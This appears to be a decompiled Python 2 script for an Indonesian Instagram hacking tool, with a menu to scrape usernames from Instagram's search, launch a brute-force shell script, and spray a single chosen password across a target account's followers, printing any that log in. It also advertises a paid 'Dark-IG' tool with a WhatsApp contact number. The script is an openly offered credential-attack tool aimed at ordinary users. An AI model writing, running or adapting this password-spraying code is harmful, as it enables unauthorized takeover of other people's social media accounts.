# Decompile At :  Sat Mar  7 16:17:57 2020
#_*_coding=UTF-8_*_
import os
import requests, os, json
from bs4 import BeautifulSoup as bs
from igtools import *
merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru = '\x1b[1;94m'
ungu = '\x1b[1;95m'
blue = '\x1b[1;96m'
putih = '\x1b[1;97m'
tutup = '\x1b[0m'
def narget():
	print(putih+'['+kuning+'!'+putih+'] '+lime+'MAX 2X')
	njay = raw_input(lime + '[' +blue+'+'+lime+']' +putih+ ' Akun yg akan ditarget : ' + putih)
	a = get_followers(njay)
	o = raw_input(lime + '[' +blue+'+'+lime+']' +putih+ ' Password to crack : '+putih)
	p = [o]
	for pw in p:
		for i in a:
			print('try in account user %s'%(i))
			if login(i,pw)==True:
				print (putih+"["+lime+"OK"+putih+"] "+putih+"user : %s, password : %s"%(i,pw))
def tutor():
	print putih+'['+lime+'+'+putih+']'+putih+'\nCreator: Nubzbie' + tutup
	print putih+'['+lime+'+'+putih+']'+putih+'\nSupport: JustAhacker' + tutup
	print putih+'['+lime+'+'+putih+']'+putih+'\nNomer Wa: 08979408648' + tutup
	print putih+'['+lime+'+'+putih+']'+putih+'\nTools versi: 1.0' + tutup
	print putih+'['+lime+'+'+putih+']'+putih+'\nNantikan Update selanjutnya' + tutup
def anjay():
	os.system('clear')
	print merah + """ ███▄ ▄███▓ ▄▄▄▄     █████▒    ██▓  ▄████ 
▓██▒▀█▀ ██▒▓█████▄ ▓██   ▒    ▓██▒ ██▒ ▀█▒
▓██    ▓██░▒██▒ ▄██▒████ ░    ▒██▒▒██░▄▄▄░
▒██    ▒██ ▒██░█▀  ░▓█▒  ░    ░██░░▓█  ██▓
▒██▒   ░██▒░▓█  ▀█▓░▒█░       ░██░░▒▓███▀▒
░ ▒░   ░  ░░▒▓███▀▒ ▒ ░       ░▓   ░▒   ▒ 
░  ░      ░▒░▒   ░  ░          ▒ ░  ░   ░ 
░      ░    ░    ░  ░ ░        ▒ ░░ ░   ░ 
       ░    ░                  ░        ░ 
                 ░                        \nAuthor  : Nubzbie\nSupport : JustAhacker\n""" + tutup
def welcome():
	print(putih + "["+lime+"1"+putih+"] "+putih+ "DUMP USERNAME    "+ putih+"["+lime+"ON"+putih+"]")
	print(putih + "["+lime+"2"+putih+"] "+putih+ "MULTI BRUTEFORCE "+ putih+"["+lime+"ON"+putih+"]")
	print(putih + "["+lime+"3"+putih+"] "+putih+ "HACK NARGET      "+ putih+"["+lime+"ON"+putih+"]")
	print(putih + "["+lime+"4"+putih+"] "+putih+ "DARK-IG          "+ putih+"["+kuning+"PREMIUM"+putih+"]")
	print (putih + "["+lime+"5"+putih+"] "+putih+ "INFO TOOLS       "+ putih+"["+lime+"ON"+putih+"]")

def brute():
	os.system('bash bruteig.sh')
def ig():
	us =[]
	raw = raw_input(lime + '['+biru+'+'+lime+']'+putih+'username[without@] = '+ tutup)
	anjay = requests.get('https://www.instagram.com/web/search/topsearch/?context=blended&query='+raw)
	x = json.loads(anjay.text)
	az=open('/sdcard/hasil.txt','w')
	for i in x['users']:
		nama = i["user"]["username"]
		us.append(nama)
		az.write(nama + '\n')
		print nama
	print('[!] Total : '+str(len(us)))
	print('File Tersimpan di : '+blue+'/sdcard/hasil.txt')
	az.close()
	
def main_menu():
	anjay()
	welcome()
	pilih = raw_input(putih+'\ninput : '+tutup)
	if pilih == '1':
		anjay()
		ig()
	elif pilih == '2':
		brute()
	elif pilih == '3':
		anjay()
		narget()
	elif pilih == '4':
		print(lime+'</> '+merah+'Maaf!!'+biru+'\nDark-IG hanya digunakan untuk user premium')
		ph = raw_input(putih+'['+kuning+'?'+putih+'] '+putih+'Mau beli Dark-IG[y/n] : ')
		if ph == 'y':
			os.system('xdg-open https://api.whatsapp.com/send?phone=628979408648&text=Saya%20ingin%20membeli%20Dark-IG')
		elif ph == 'n':
			os.system('python2 weldat.py')
	elif pilih == '5':
		anjay()
		tutor()
	else:
		print ('pilih gayn')

main_menu()
